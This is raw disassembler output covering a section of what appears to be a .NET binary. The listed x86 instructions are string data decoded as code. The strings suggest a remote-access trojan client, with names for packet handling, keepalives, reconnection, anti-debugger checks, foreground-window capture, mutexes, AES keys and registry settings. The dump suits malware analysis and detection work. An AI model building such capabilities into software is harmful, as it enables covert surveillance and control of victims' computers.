  4090b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4090b9:	74 73                	je     0x40912e
  4090bb:	00 50 6f             	add    %dl,0x6f(%eax)
  4090be:	72 74                	jb     0x409134
  4090c0:	73 00                	jae    0x4090c2
  4090c2:	45                   	inc    %ebp
  4090c3:	78 69                	js     0x40912e
  4090c5:	73 74                	jae    0x40913b
  4090c7:	73 00                	jae    0x4090c9
  4090c9:	48                   	dec    %eax
  4090ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4090cb:	73 74                	jae    0x409141
  4090cd:	73 00                	jae    0x4090cf
  4090cf:	41                   	inc    %ecx
  4090d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4090d1:	74 69                	je     0x40913c
  4090d3:	76 69                	jbe    0x40913e
  4090d5:	72 75                	jb     0x40914c
  4090d7:	73 00                	jae    0x4090d9
  4090d9:	43                   	inc    %ebx
  4090da:	6f                   	outsl  %ds:(%esi),(%dx)
  4090db:	6e                   	outsb  %ds:(%esi),(%dx)
  4090dc:	63 61 74             	arpl   %esp,0x74(%ecx)
  4090df:	00 49 6d             	add    %cl,0x6d(%ecx)
  4090e2:	61                   	popa
  4090e3:	67 65 46             	addr16 gs inc %esi
  4090e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4090e7:	72 6d                	jb     0x409156
  4090e9:	61                   	popa
  4090ea:	74 00                	je     0x4090ec
  4090ec:	66 6f                	outsw  %ds:(%esi),(%dx)
  4090ee:	72 6d                	jb     0x40915d
  4090f0:	61                   	popa
  4090f1:	74 00                	je     0x4090f3
  4090f3:	57                   	push   %edi
  4090f4:	72 69                	jb     0x40915f
  4090f6:	74 65                	je     0x40915d
  4090f8:	46                   	inc    %esi
  4090f9:	6c                   	insb   (%dx),%es:(%edi)
  4090fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4090fb:	61                   	popa
  4090fc:	74 00                	je     0x4090fe
  4090fe:	67 65 74 5f          	addr16 gs je 0x409161
  409102:	41                   	inc    %ecx
  409103:	73 46                	jae    0x40914b
  409105:	6c                   	insb   (%dx),%es:(%edi)
  409106:	6f                   	outsl  %ds:(%esi),(%dx)
  409107:	61                   	popa
  409108:	74 00                	je     0x40910a
  40910a:	73 65                	jae    0x409171
  40910c:	74 5f                	je     0x40916d
  40910e:	41                   	inc    %ecx
  40910f:	73 46                	jae    0x409157
  409111:	6c                   	insb   (%dx),%es:(%edi)
  409112:	6f                   	outsl  %ds:(%esi),(%dx)
  409113:	61                   	popa
  409114:	74 00                	je     0x409116
  409116:	47                   	inc    %edi
  409117:	65 74 41             	gs je  0x40915b
  40911a:	73 46                	jae    0x409162
  40911c:	6c                   	insb   (%dx),%es:(%edi)
  40911d:	6f                   	outsl  %ds:(%esi),(%dx)
  40911e:	61                   	popa
  40911f:	74 00                	je     0x409121
  409121:	53                   	push   %ebx
  409122:	65 74 41             	gs je  0x409166
  409125:	73 46                	jae    0x40916d
  409127:	6c                   	insb   (%dx),%es:(%edi)
  409128:	6f                   	outsl  %ds:(%esi),(%dx)
  409129:	61                   	popa
  40912a:	74 00                	je     0x40912c
  40912c:	46                   	inc    %esi
  40912d:	69 6e 64 4f 62 6a 65 	imul   $0x656a624f,0x64(%esi),%ebp
  409134:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  409138:	61                   	popa
  409139:	6e                   	outsb  %ds:(%esi),(%dx)
  40913a:	61                   	popa
  40913b:	67 65 6d             	gs insl (%dx),%es:(%di)
  40913e:	65 6e                	outsb  %gs:(%esi),(%dx)
  409140:	74 42                	je     0x409184
  409142:	61                   	popa
  409143:	73 65                	jae    0x4091aa
  409145:	4f                   	dec    %edi
  409146:	62 6a 65             	bound  %ebp,0x65(%edx)
  409149:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  40914d:	6f                   	outsl  %ds:(%esi),(%dx)
  40914e:	72 63                	jb     0x4091b3
  409150:	65 50                	gs push %eax
  409152:	61                   	popa
  409153:	74 68                	je     0x4091bd
  409155:	4f                   	dec    %edi
  409156:	62 6a 65             	bound  %ebp,0x65(%edx)
  409159:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  40915d:	6f                   	outsl  %ds:(%esi),(%dx)
  40915e:	6c                   	insb   (%dx),%es:(%edi)
  40915f:	6c                   	insb   (%dx),%es:(%edi)
  409160:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  409165:	6f                   	outsl  %ds:(%esi),(%dx)
  409166:	6e                   	outsb  %ds:(%esi),(%dx)
  409167:	6e                   	outsb  %ds:(%esi),(%dx)
  409168:	65 63 74 00 52       	arpl   %esi,%gs:0x52(%eax,%eax,1)
  40916d:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  409171:	6e                   	outsb  %ds:(%esi),(%dx)
  409172:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  409177:	65 74 00             	gs je  0x40917a
  40917a:	53                   	push   %ebx
  40917b:	79 73                	jns    0x4091f0
  40917d:	74 65                	je     0x4091e4
  40917f:	6d                   	insl   (%dx),%es:(%edi)
  409180:	2e 4e                	cs dec %esi
  409182:	65 74 00             	gs je  0x409185
  409185:	53                   	push   %ebx
  409186:	65 74 00             	gs je  0x409189
  409189:	54                   	push   %esp
  40918a:	61                   	popa
  40918b:	72 67                	jb     0x4091f4
  40918d:	65 74 00             	gs je  0x409190
  409190:	43                   	inc    %ebx
  409191:	6c                   	insb   (%dx),%es:(%edi)
  409192:	69 65 6e 74 2e 48 61 	imul   $0x61482e74,0x6e(%ebp),%esp
  409199:	6e                   	outsb  %ds:(%esi),(%dx)
  40919a:	64 6c                	fs insb (%dx),%es:(%edi)
  40919c:	65 5f                	gs pop %edi
  40919e:	50                   	push   %eax
  40919f:	61                   	popa
  4091a0:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4091a3:	74 00                	je     0x4091a5
  4091a5:	4b                   	dec    %ebx
  4091a6:	65 65 70 41          	gs gs jo 0x4091eb
  4091aa:	6c                   	insb   (%dx),%es:(%edi)
  4091ab:	69 76 65 50 61 63 6b 	imul   $0x6b636150,0x65(%esi),%esi
  4091b2:	65 74 00             	gs je  0x4091b5
  4091b5:	43                   	inc    %ebx
  4091b6:	6c                   	insb   (%dx),%es:(%edi)
  4091b7:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  4091be:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  4091c2:	53                   	push   %ebx
  4091c3:	79 73                	jns    0x409238
  4091c5:	74 65                	je     0x40922c
  4091c7:	6d                   	insl   (%dx),%es:(%edi)
  4091c8:	2e 43                	cs inc %ebx
  4091ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4091cb:	6c                   	insb   (%dx),%es:(%edi)
  4091cc:	6c                   	insb   (%dx),%es:(%edi)
  4091cd:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4091d3:	73 2e                	jae    0x409203
  4091d5:	49                   	dec    %ecx
  4091d6:	45                   	inc    %ebp
  4091d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4091d8:	75 6d                	jne    0x409247
  4091da:	65 72 61             	gs jb  0x40923e
  4091dd:	74 6f                	je     0x40924e
  4091df:	72 2e                	jb     0x40920f
  4091e1:	52                   	push   %edx
  4091e2:	65 73 65             	gs jae 0x40924a
  4091e5:	74 00                	je     0x4091e7
  4091e7:	67 65 74 5f          	addr16 gs je 0x40924a
  4091eb:	4f                   	dec    %edi
  4091ec:	66 66 73 65          	data16 data16 jae 0x409255
  4091f0:	74 00                	je     0x4091f2
  4091f2:	73 65                	jae    0x409259
  4091f4:	74 5f                	je     0x409255
  4091f6:	4f                   	dec    %edi
  4091f7:	66 66 73 65          	data16 data16 jae 0x409260
  4091fb:	74 00                	je     0x4091fd
  4091fd:	53                   	push   %ebx
  4091fe:	70 6c                	jo     0x40926c
  409200:	69 74 00 43 6c 69 65 	imul   $0x6e65696c,0x43(%eax,%eax,1),%esi
  409207:	6e 
  409208:	74 4f                	je     0x409259
  40920a:	6e                   	outsb  %ds:(%esi),(%dx)
  40920b:	45                   	inc    %ebp
  40920c:	78 69                	js     0x409277
  40920e:	74 00                	je     0x409210
  409210:	53                   	push   %ebx
  409211:	61                   	popa
  409212:	6c                   	insb   (%dx),%es:(%edi)
  409213:	74 00                	je     0x409215
  409215:	49                   	dec    %ecx
  409216:	41                   	inc    %ecx
  409217:	73 79                	jae    0x409292
  409219:	6e                   	outsb  %ds:(%esi),(%dx)
  40921a:	63 52 65             	arpl   %edx,0x65(%edx)
  40921d:	73 75                	jae    0x409294
  40921f:	6c                   	insb   (%dx),%es:(%edi)
  409220:	74 00                	je     0x409222
  409222:	54                   	push   %esp
  409223:	6f                   	outsl  %ds:(%esi),(%dx)
  409224:	55                   	push   %ebp
  409225:	70 70                	jo     0x409297
  409227:	65 72 49             	gs jb  0x409273
  40922a:	6e                   	outsb  %ds:(%esi),(%dx)
  40922b:	76 61                	jbe    0x40928e
  40922d:	72 69                	jb     0x409298
  40922f:	61                   	popa
  409230:	6e                   	outsb  %ds:(%esi),(%dx)
  409231:	74 00                	je     0x409233
  409233:	57                   	push   %edi
  409234:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409238:	69 65 6e 74 00 49 6e 	imul   $0x6e490074,0x6e(%ebp),%esp
  40923f:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409246:	65 
  409247:	43                   	inc    %ebx
  409248:	6c                   	insb   (%dx),%es:(%edi)
  409249:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409250:	74 5f                	je     0x4092b1
  409252:	53                   	push   %ebx
  409253:	73 6c                	jae    0x4092c1
  409255:	43                   	inc    %ebx
  409256:	6c                   	insb   (%dx),%es:(%edi)
  409257:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  40925e:	74 5f                	je     0x4092bf
  409260:	53                   	push   %ebx
  409261:	73 6c                	jae    0x4092cf
  409263:	43                   	inc    %ebx
  409264:	6c                   	insb   (%dx),%es:(%edi)
  409265:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  40926c:	74 5f                	je     0x4092cd
  40926e:	54                   	push   %esp
  40926f:	63 70 43             	arpl   %esi,0x43(%eax)
  409272:	6c                   	insb   (%dx),%es:(%edi)
  409273:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  40927a:	74 5f                	je     0x4092db
  40927c:	54                   	push   %esp
  40927d:	63 70 43             	arpl   %esi,0x43(%eax)
  409280:	6c                   	insb   (%dx),%es:(%edi)
  409281:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409288:	74 68                	je     0x4092f2
  40928a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40928c:	74 69                	je     0x4092f7
  40928e:	63 61 74             	arpl   %esp,0x74(%ecx)
  409291:	65 41                	gs inc %ecx
  409293:	73 43                	jae    0x4092d8
  409295:	6c                   	insb   (%dx),%es:(%edi)
  409296:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  40929d:	73 74                	jae    0x409313
  40929f:	65 6d                	gs insl (%dx),%es:(%edi)
  4092a1:	2e 4d                	cs dec %ebp
  4092a3:	61                   	popa
  4092a4:	6e                   	outsb  %ds:(%esi),(%dx)
  4092a5:	61                   	popa
  4092a6:	67 65 6d             	gs insl (%dx),%es:(%di)
  4092a9:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092ab:	74 00                	je     0x4092ad
  4092ad:	45                   	inc    %ebp
  4092ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4092af:	76 69                	jbe    0x40931a
  4092b1:	72 6f                	jb     0x409322
  4092b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b4:	6d                   	insl   (%dx),%es:(%edi)
  4092b5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092b7:	74 00                	je     0x4092b9
  4092b9:	70 61                	jo     0x40931c
  4092bb:	72 65                	jb     0x409322
  4092bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4092be:	74 00                	je     0x4092c0
  4092c0:	53                   	push   %ebx
  4092c1:	79 73                	jns    0x409336
  4092c3:	74 65                	je     0x40932a
  4092c5:	6d                   	insl   (%dx),%es:(%edi)
  4092c6:	2e 43                	cs inc %ebx
  4092c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4092c9:	6c                   	insb   (%dx),%es:(%edi)
  4092ca:	6c                   	insb   (%dx),%es:(%edi)
  4092cb:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4092d1:	73 2e                	jae    0x409301
  4092d3:	49                   	dec    %ecx
  4092d4:	45                   	inc    %ebp
  4092d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4092d6:	75 6d                	jne    0x409345
  4092d8:	65 72 61             	gs jb  0x40933c
  4092db:	74 6f                	je     0x40934c
  4092dd:	72 2e                	jb     0x40930d
  4092df:	43                   	inc    %ebx
  4092e0:	75 72                	jne    0x409354
  4092e2:	72 65                	jb     0x409349
  4092e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4092e5:	74 00                	je     0x4092e7
  4092e7:	53                   	push   %ebx
  4092e8:	79 73                	jns    0x40935d
  4092ea:	74 65                	je     0x409351
  4092ec:	6d                   	insl   (%dx),%es:(%edi)
  4092ed:	2e 43                	cs inc %ebx
  4092ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4092f0:	6c                   	insb   (%dx),%es:(%edi)
  4092f1:	6c                   	insb   (%dx),%es:(%edi)
  4092f2:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4092f8:	73 2e                	jae    0x409328
  4092fa:	49                   	dec    %ecx
  4092fb:	45                   	inc    %ebp
  4092fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4092fd:	75 6d                	jne    0x40936c
  4092ff:	65 72 61             	gs jb  0x409363
  409302:	74 6f                	je     0x409373
  409304:	72 2e                	jb     0x409334
  409306:	67 65 74 5f          	addr16 gs je 0x409369
  40930a:	43                   	inc    %ebx
  40930b:	75 72                	jne    0x40937f
  40930d:	72 65                	jb     0x409374
  40930f:	6e                   	outsb  %ds:(%esi),(%dx)
  409310:	74 00                	je     0x409312
  409312:	47                   	inc    %edi
  409313:	65 74 43             	gs je  0x409359
  409316:	75 72                	jne    0x40938a
  409318:	72 65                	jb     0x40937f
  40931a:	6e                   	outsb  %ds:(%esi),(%dx)
  40931b:	74 00                	je     0x40931d
  40931d:	43                   	inc    %ebx
  40931e:	68 65 63 6b 52       	push   $0x526b6365
  409323:	65 6d                	gs insl (%dx),%es:(%edi)
  409325:	6f                   	outsl  %ds:(%esi),(%dx)
  409326:	74 65                	je     0x40938d
  409328:	44                   	inc    %esp
  409329:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40932d:	67 65 72 50          	addr16 gs jb 0x409381
  409331:	72 65                	jb     0x409398
  409333:	73 65                	jae    0x40939a
  409335:	6e                   	outsb  %ds:(%esi),(%dx)
  409336:	74 00                	je     0x409338
  409338:	69 73 44 65 62 75 67 	imul   $0x67756265,0x44(%ebx),%esi
  40933f:	67 65 72 50          	addr16 gs jb 0x409393
  409343:	72 65                	jb     0x4093aa
  409345:	73 65                	jae    0x4093ac
  409347:	6e                   	outsb  %ds:(%esi),(%dx)
  409348:	74 00                	je     0x40934a
  40934a:	67 65 74 5f          	addr16 gs je 0x4093ad
  40934e:	52                   	push   %edx
  40934f:	65 6d                	gs insl (%dx),%es:(%edi)
  409351:	6f                   	outsl  %ds:(%esi),(%dx)
  409352:	74 65                	je     0x4093b9
  409354:	45                   	inc    %ebp
  409355:	6e                   	outsb  %ds:(%esi),(%dx)
  409356:	64 50                	fs push %eax
  409358:	6f                   	outsl  %ds:(%esi),(%dx)
  409359:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409360:	5f                   	pop    %edi
  409361:	43                   	inc    %ebx
  409362:	6f                   	outsl  %ds:(%esi),(%dx)
  409363:	75 6e                	jne    0x4093d3
  409365:	74 00                	je     0x409367
  409367:	67 65 74 5f          	addr16 gs je 0x4093ca
  40936b:	50                   	push   %eax
  40936c:	72 6f                	jb     0x4093dd
  40936e:	63 65 73             	arpl   %esp,0x73(%ebp)
  409371:	73 6f                	jae    0x4093e2
  409373:	72 43                	jb     0x4093b8
  409375:	6f                   	outsl  %ds:(%esi),(%dx)
  409376:	75 6e                	jne    0x4093e6
  409378:	74 00                	je     0x40937a
  40937a:	63 6f 75             	arpl   %ebp,0x75(%edi)
  40937d:	6e                   	outsb  %ds:(%esi),(%dx)
  40937e:	74 00                	je     0x409380
  409380:	47                   	inc    %edi
  409381:	65 74 50             	gs je  0x4093d4
  409384:	61                   	popa
  409385:	74 68                	je     0x4093ef
  409387:	52                   	push   %edx
  409388:	6f                   	outsl  %ds:(%esi),(%dx)
  409389:	6f                   	outsl  %ds:(%esi),(%dx)
  40938a:	74 00                	je     0x40938c
  40938c:	44                   	inc    %esp
  40938d:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  409391:	70 74                	jo     0x409407
  409393:	00 45 6e             	add    %al,0x6e(%ebp)
  409396:	63 72 79             	arpl   %esi,0x79(%edx)
  409399:	70 74                	jo     0x40940f
  40939b:	00 50 61             	add    %dl,0x61(%eax)
  40939e:	72 61                	jb     0x409401
  4093a0:	6d                   	insl   (%dx),%es:(%edi)
  4093a1:	65 74 65             	gs je  0x409409
  4093a4:	72 69                	jb     0x40940f
  4093a6:	7a 65                	jp     0x40940d
  4093a8:	64 54                	fs push %esp
  4093aa:	68 72 65 61 64       	push   $0x64616572
  4093af:	53                   	push   %ebx
  4093b0:	74 61                	je     0x409413
  4093b2:	72 74                	jb     0x409428
  4093b4:	00 43 6f             	add    %al,0x6f(%ebx)
  4093b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4093b8:	76 65                	jbe    0x40941f
  4093ba:	72 74                	jb     0x409430
  4093bc:	00 46 61             	add    %al,0x61(%esi)
  4093bf:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  4093c6:	54 
  4093c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4093c8:	4c                   	dec    %esp
  4093c9:	69 73 74 00 69 6e 70 	imul   $0x706e6900,0x74(%ebx),%esi
  4093d0:	75 74                	jne    0x409446
  4093d2:	00 53 79             	add    %dl,0x79(%ebx)
  4093d5:	73 74                	jae    0x40944b
  4093d7:	65 6d                	gs insl (%dx),%es:(%edi)
  4093d9:	2e 43                	cs inc %ebx
  4093db:	6f                   	outsl  %ds:(%esi),(%dx)
  4093dc:	6c                   	insb   (%dx),%es:(%edi)
  4093dd:	6c                   	insb   (%dx),%es:(%edi)
  4093de:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4093e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4093e4:	73 2e                	jae    0x409414
  4093e6:	49                   	dec    %ecx
  4093e7:	45                   	inc    %ebp
  4093e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4093e9:	75 6d                	jne    0x409458
  4093eb:	65 72 61             	gs jb  0x40944f
  4093ee:	74 6f                	je     0x40945f
  4093f0:	72 2e                	jb     0x409420
  4093f2:	4d                   	dec    %ebp
  4093f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4093f4:	76 65                	jbe    0x40945b
  4093f6:	4e                   	dec    %esi
  4093f7:	65 78 74             	gs js  0x40946e
  4093fa:	00 53 79             	add    %dl,0x79(%ebx)
  4093fd:	73 74                	jae    0x409473
  4093ff:	65 6d                	gs insl (%dx),%es:(%edi)
  409401:	2e 54                	cs push %esp
  409403:	65 78 74             	gs js  0x40947a
  409406:	00 47 65             	add    %al,0x65(%edi)
  409409:	74 57                	je     0x409462
  40940b:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409412:	78 74                	js     0x409488
  409414:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  409418:	74 00                	je     0x40941a
  40941a:	53                   	push   %ebx
  40941b:	54                   	push   %esp
  40941c:	75 00                	jne    0x40941e
  40941e:	76 00                	jbe    0x409420
  409420:	47                   	inc    %edi
  409421:	65 74 46             	gs je  0x40946a
  409424:	6f                   	outsl  %ds:(%esi),(%dx)
  409425:	72 65                	jb     0x40948c
  409427:	67 72 6f             	addr16 jb 0x409499
  40942a:	75 6e                	jne    0x40949a
  40942c:	64 57                	fs push %edi
  40942e:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  409435:	65 74 5f             	gs je  0x409497
  409438:	43                   	inc    %ebx
  409439:	72 65                	jb     0x4094a0
  40943b:	61                   	popa
  40943c:	74 65                	je     0x4094a3
  40943e:	4e                   	dec    %esi
  40943f:	6f                   	outsl  %ds:(%esi),(%dx)
  409440:	57                   	push   %edi
  409441:	69 6e 64 6f 77 00 69 	imul   $0x6900776f,0x64(%esi),%ebp
  409448:	6e                   	outsb  %ds:(%esi),(%dx)
  409449:	64 65 78 00          	fs gs js 0x40944d
  40944d:	43                   	inc    %ebx
  40944e:	6c                   	insb   (%dx),%es:(%edi)
  40944f:	6f                   	outsl  %ds:(%esi),(%dx)
  409450:	73 65                	jae    0x4094b7
  409452:	4d                   	dec    %ebp
  409453:	75 74                	jne    0x4094c9
  409455:	65 78 00             	gs js  0x409458
  409458:	43                   	inc    %ebx
  409459:	72 65                	jb     0x4094c0
  40945b:	61                   	popa
  40945c:	74 65                	je     0x4094c3
  40945e:	4d                   	dec    %ebp
  40945f:	75 74                	jne    0x4094d5
  409461:	65 78 00             	gs js  0x409464
  409464:	44                   	inc    %esp
  409465:	65 6c                	gs insb (%dx),%es:(%edi)
  409467:	61                   	popa
  409468:	79 00                	jns    0x40946a
  40946a:	57                   	push   %edi
  40946b:	69 72 74 65 41 72 72 	imul   $0x72724165,0x74(%edx),%esi
  409472:	61                   	popa
  409473:	79 00                	jns    0x409475
  409475:	49                   	dec    %ecx
  409476:	6e                   	outsb  %ds:(%esi),(%dx)
  409477:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40947e:	65 
  40947f:	41                   	inc    %ecx
  409480:	72 72                	jb     0x4094f4
  409482:	61                   	popa
  409483:	79 00                	jns    0x409485
  409485:	4d                   	dec    %ebp
  409486:	73 67                	jae    0x4094ef
  409488:	50                   	push   %eax
  409489:	61                   	popa
  40948a:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  40948d:	72 72                	jb     0x409501
  40948f:	61                   	popa
  409490:	79 00                	jns    0x409492
  409492:	54                   	push   %esp
  409493:	6f                   	outsl  %ds:(%esi),(%dx)
  409494:	41                   	inc    %ecx
  409495:	72 72                	jb     0x409509
  409497:	61                   	popa
  409498:	79 00                	jns    0x40949a
  40949a:	67 65 74 5f          	addr16 gs je 0x4094fd
  40949e:	41                   	inc    %ecx
  40949f:	73 41                	jae    0x4094e2
  4094a1:	72 72                	jb     0x409515
  4094a3:	61                   	popa
  4094a4:	79 00                	jns    0x4094a6
  4094a6:	72 65                	jb     0x40950d
  4094a8:	66 41                	inc    %cx
  4094aa:	73 41                	jae    0x4094ed
  4094ac:	72 72                	jb     0x409520
  4094ae:	61                   	popa
  4094af:	79 00                	jns    0x4094b1
  4094b1:	67 65 74 5f          	addr16 gs je 0x409514
  4094b5:	4b                   	dec    %ebx
  4094b6:	65 79 00             	gs jns 0x4094b9
  4094b9:	73 65                	jae    0x409520
  4094bb:	74 5f                	je     0x40951c
  4094bd:	4b                   	dec    %ebx
  4094be:	65 79 00             	gs jns 0x4094c1
  4094c1:	43                   	inc    %ebx
  4094c2:	72 65                	jb     0x409529
  4094c4:	61                   	popa
  4094c5:	74 65                	je     0x40952c
  4094c7:	53                   	push   %ebx
  4094c8:	75 62                	jne    0x40952c
  4094ca:	4b                   	dec    %ebx
  4094cb:	65 79 00             	gs jns 0x4094ce
  4094ce:	44                   	inc    %esp
  4094cf:	65 6c                	gs insb (%dx),%es:(%edi)
  4094d1:	65 74 65             	gs je  0x409539
  4094d4:	53                   	push   %ebx
  4094d5:	75 62                	jne    0x409539
  4094d7:	4b                   	dec    %ebx
  4094d8:	65 79 00             	gs jns 0x4094db
  4094db:	4f                   	dec    %edi
  4094dc:	70 65                	jo     0x409543
  4094de:	6e                   	outsb  %ds:(%esi),(%dx)
  4094df:	53                   	push   %ebx
  4094e0:	75 62                	jne    0x409544
  4094e2:	4b                   	dec    %ebx
  4094e3:	65 79 00             	gs jns 0x4094e6
  4094e6:	67 65 74 5f          	addr16 gs je 0x409549
  4094ea:	50                   	push   %eax
  4094eb:	75 62                	jne    0x40954f
  4094ed:	6c                   	insb   (%dx),%es:(%edi)
  4094ee:	69 63 4b 65 79 00 5f 	imul   $0x5f007965,0x4b(%ebx),%esp
  4094f5:	61                   	popa
  4094f6:	75 74                	jne    0x40956c
  4094f8:	68 4b 65 79 00       	push   $0x79654b
  4094fd:	6d                   	insl   (%dx),%es:(%edi)
  4094fe:	61                   	popa
  4094ff:	73 74                	jae    0x409575
  409501:	65 72 4b             	gs jb  0x40954f
  409504:	65 79 00             	gs jns 0x409507
  409507:	52                   	push   %edx
  409508:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  40950f:	4b 65 
  409511:	79 00                	jns    0x409513
  409513:	5f                   	pop    %edi
  409514:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  409518:	53                   	push   %ebx
  409519:	79 73                	jns    0x40958e
  40951b:	74 65                	je     0x409582
  40951d:	6d                   	insl   (%dx),%es:(%edi)
  40951e:	2e 53                	cs push %ebx
  409520:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409524:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  40952b:	70 
  40952c:	74 6f                	je     0x40959d
  40952e:	67 72 61             	addr16 jb 0x409592
  409531:	70 68                	jo     0x40959b
  409533:	79 00                	jns    0x409535
  409535:	41                   	inc    %ecx
  409536:	73 73                	jae    0x4095ab
  409538:	65 6d                	gs insl (%dx),%es:(%edi)
  40953a:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  40953e:	41                   	inc    %ecx
  40953f:	64 64 72 65          	fs fs jb 0x4095a8
  409543:	73 73                	jae    0x4095b8
  409545:	46                   	inc    %esi
  409546:	61                   	popa
  409547:	6d                   	insl   (%dx),%es:(%edi)
  409548:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  40954f:	63 
  409550:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  409554:	79 00                	jns    0x409556
  409556:	57                   	push   %edi
  409557:	72 69                	jb     0x4095c2
  409559:	74 65                	je     0x4095c0
  40955b:	42                   	inc    %edx
  40955c:	69 6e 61 72 79 00 54 	imul   $0x54007972,0x61(%esi),%ebp
  409563:	6f                   	outsl  %ds:(%esi),(%dx)
  409564:	42                   	inc    %edx
  409565:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  40956c:	65 74 5f             	gs je  0x4095ce
  40956f:	53                   	push   %ebx
  409570:	79 73                	jns    0x4095e5
  409572:	74 65                	je     0x4095d9
  409574:	6d                   	insl   (%dx),%es:(%edi)
  409575:	44                   	inc    %esp
  409576:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40957d:	79 00                	jns    0x40957f
  40957f:	53                   	push   %ebx
  409580:	65 74 52             	gs je  0x4095d5
  409583:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  40958a:	00 6f 
  40958c:	70 5f                	jo     0x4095ed
  40958e:	45                   	inc    %ebp
  40958f:	71 75                	jno    0x409606
  409591:	61                   	popa
  409592:	6c                   	insb   (%dx),%es:(%edi)
  409593:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  40959a:	49 
  40959b:	6e                   	outsb  %ds:(%esi),(%dx)
  40959c:	65 71 75             	gs jno 0x409614
  40959f:	61                   	popa
  4095a0:	6c                   	insb   (%dx),%es:(%edi)
  4095a1:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  4095a8:	74 
  4095a9:	65 6d                	gs insl (%dx),%es:(%edi)
  4095ab:	2e 4e                	cs dec %esi
  4095ad:	65 74 2e             	gs je  0x4095de
  4095b0:	53                   	push   %ebx
  4095b1:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4095b5:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  4095bc:	64 
  4095bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4095be:	77 73                	ja     0x409633
  4095c0:	49                   	dec    %ecx
  4095c1:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4095c4:	74 69                	je     0x40962f
  4095c6:	74 79                	je     0x409641
  4095c8:	00 49 73             	add    %cl,0x73(%ecx)
  4095cb:	4e                   	dec    %esi
  4095cc:	75 6c                	jne    0x40963a
  4095ce:	6c                   	insb   (%dx),%es:(%edi)
  4095cf:	4f                   	dec    %edi
  4095d0:	72 45                	jb     0x409617
  4095d2:	6d                   	insl   (%dx),%es:(%edi)
